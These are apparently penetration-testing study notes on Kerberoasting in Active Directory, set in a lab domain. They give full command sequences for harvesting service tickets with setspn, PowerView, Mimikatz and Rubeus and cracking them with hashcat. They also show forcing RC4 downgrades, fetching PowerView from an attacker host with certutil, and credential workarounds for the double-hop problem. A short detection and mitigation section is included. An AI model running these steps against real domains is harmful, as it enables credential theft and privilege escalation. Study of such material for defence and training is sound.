# üîê Kerberoasting 

[See about Kerberos authentication](kerberos-authentication.md).

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:

- RC4 (type 23) encryption: TGS ¬†hashes that begin with¬†`$krb5tgs$23$*`
- AES-256 (type 18) encryption: TGS ¬†hashes that begin with¬†`$krb5tgs$18$*`

## setspn.exe

**1.** Enumerating SPNs with setspn.exe

```cmd-session
setspn.exe -Q */*
```

We will focus on¬†`user accounts`¬†and ignore the computer accounts returned by the tool.

**2.** Using PowerShell, we can request TGS tickets for the interested account and load them into memory.

```powershell
Add-Type -AssemblyName System.IdentityModel
# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
#  New-Object cmdlet to create an instance of a .NET Framework object.
# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
# -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
```


**3.** If needed, we could also retrieve all tickets:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```


**4.** Extract Tickets from Memory with Mimikatz

```cmd-session
# Launch mimikatz
mimikatz.exe

# Specify base64
base64 /out:true
# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.

# Export the tickets
kerberos::list /export 
```

**5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

```shell-session
echo "<base64 blob>" |  tr -d \\n 
```


**6.** We can place the above single line of output into a file and convert it back to a¬†`.kirbi`¬†file using the¬†`base64`¬†utility.

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

**7.** Use [kirbi2john.py](kirbi2john.md):


```shell-session
python2.7 kirbi2john.py Filename.kirbi
```

This will create a file called¬†`crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
```

**8.** Cracking the hash with Hashcat

```shell-session
hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

If we decide to skip the base64 output with Mimikatz and type¬†`mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run¬†`kirbi2john.py`¬†against them directly, skipping the base64 decoding step.

## PowerView

Let's use PowerView to extract the TGS tickets and convert them to Hashcat format. 

**1.** Enumerating SPNs with PowerView:

```powershell
# certutil -urlcache -f http://$ip/PowerView.ps1 PowerView.ps1
# Import module
Import-Module .\PowerView.ps1

# List SPNs: Option 1
Get-DomainUser * -spn | select samaccountname

# List SPNs: Option 2
Get-NetUser -SPN
```

**2.** Generate a TGS ticker for a specific user:

```powershell
# Option 1
Get-DomainUser -Identity $samAccountName | Get-DomainSPNTicket -Format Hashcat
# Example: 
# Get-DomainUser -Identity MSSQLSvc/SQL01.inlanefreight.local:1433 | Get-DomainSPNTicket -Format Hashcat


# Option 2
Get-DomainSPNTicket -SPN $samAccountName -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt
# Example: 
# Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt
```

**3.** Or obtain all SPN TGS tickets and export them to a CSV

```powershell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\FileName.csv -NoTypeInformation
```


## Rubeus

[See more about Rubeus](rubeus.md).

Gather stats:

```powershell
.\Rubeus.exe kerberoast /stats
```

Request tickets with admincount attribute set to 1:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
# /nowrap flag: so that the hash can be more easily copied down for offline cracking using Hashcat. The ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped.
```

 Perform Kerberoasting on a user testspn:
 
```powershell
# Perform Kerberoasting on a user testspn
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack. We can check out if the user hast the `msDS-SupportedEncryptionTypes`¬†attribute is set to¬†`0`.  The chart¬†[here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797)¬†tells us that a decimal value of¬†`0`¬†means that a specific encryption type is not defined and set to the default of¬†`RC4_HMAC_MD5`.

```powershell
# Check the encryption of the TGS ticket for user testspn
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes


#serviceprincipalname       msds-supportedencryptiontypes samaccountname
# ----------                 ----------------------------- --------------
# testspn/kerberoast.inlanefreight.local               0   testspn
```

With RC4 (type 23) encryption, this would be the hashcat module:

```shell-session
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

The results for the AES-256 (type 18) encryption would be `24`:

```powershell
# Check the encryption of the TGS ticket for user testspn
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes


#serviceprincipalname       msds-supportedencryptiontypes samaccountname
# ----------                 ----------------------------- --------------
# testspn/kerberoast.inlanefreight.local               24   testspn
```

With AES (type 18) encryption, this would be the hashcat module:

```shell-session
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

**We can use Rubeus with the¬†`/tgtdeleg`¬†flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256.** This may be a failsafe built-in to Active Directory for backward compatibility.

```powershell
# Perform Kerberoasting on a user testspn
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
# /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.
```

> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.

> In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 



## Mitigating Kerberoasting

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.

omain controllers can be configured to log Kerberos TGS ticket requests by selecting¬†[Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations)¬†within Group Policy. Doing so will generate two separate event IDs:

- ¬†[4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, 
- and¬†[4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed.

10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).

## Kerberos: Forging the PAC

This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. It can be exploited with tools such as the¬†[Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)¬†or the Impacket toolkit.

## The Golden Ticket attack

**The attack in a nugshell:** First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. ¬†The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account.


## Kerberos "Double Hop" Problem

**Kerberos "Double Hop" Problem**: The "Double Hop" problem often occurs when using WinRM/Powershell or Evil-WinRM, since the default authentication mechanism only provides a ticket to access a specific resource (winrm). When we use Kerberos to establish a remote session, we are not using a password for authentication, and the user's ticket-granting service (TGS) ticket is sent to the remote service, but the TGT ticket is not sent. Therefore, when we try to authenticate over a second resource, the machine can not pull any hash from memory or generate any TGS to authenticate us.

In a nutshell, **Kerberos "Double Hop" Problem** arises when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second, as the user's password  was never cached as part of their login.  In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.

Example once we are connected with Evil-WinRm:

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

However this does not happen with DRP connections, whereas our TGT is sent during the authentication process to obtain a service ticket for the RDP session. It is then cached on the remote host for subsequent use. This allows seamless access to domain resources from the remote host.

### Workaround #1: unconstrained delegation

If *unconstrained delegation* is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access.

### Workaround #2:  Evil-WinRM and PSCredential Object

 We can use a "nested" Invoke-Command to send credentials (after creating a PSCredential object) with every request.

```powershell
# Set up: we are connected to the host machine from our attacker machine via Evil-WinRM
# 1. We create a SecureString Object with our creds
$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force
# Example: 
# $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('$domain\$userSamAccountName', $SecPassword)
# Example:
# $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# 2. We send the nested Invoke-Command
Invoke-Command -ComputerName "$hostname.$domainName" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
# Example: 
# Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
```

```
# More things we can do. Import PowerView module and embed creds in all commands. In the example we are requesting the Service Principals. If we try without specifying the¬†`-credential`¬†flag, we get an error message.
import-module .\PowerView.ps1
get-domainuser -spn -credential $Cred | select samaccountname
```

### Workaround #3: Win-RM and Register PSSession Configuration

>Note: We cannot use¬†`Register-PSSessionConfiguration`¬†from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like¬†`-RunAsCredential $Cred`, we will get an error because we can only use¬†`RunAs`¬†from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials.

```powershell
# Establish a WinRM session on the remote host.
Enter-PSSession -ComputerName $hostName.$domain -Credential $domain\$user
# Example
# Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. One trick we can use here is registering a new session configuration using the¬†[Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2)¬†cmdlet.

```powershell
# REgister a new session
Register-PSSessionConfiguration -Name $SessionName -RunAsCredential $domain\$userSamAccountName
# Example:
# Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# Once this is done, we need to restart the WinRM service. From the PS session:
Restart-Service WinRM
# This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

# After we start the session, we can see that the double hop problem has been eliminated.
Enter-PSSession -ComputerName $hostName -Credential $domain\$userSamAccountName -ConfigurationName  $sessionName
# Example:
# Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess

# We can now run tools such as PowerView without having to create a new PSCredential object. For example:
get-domainuser -spn | select samaccountname
```
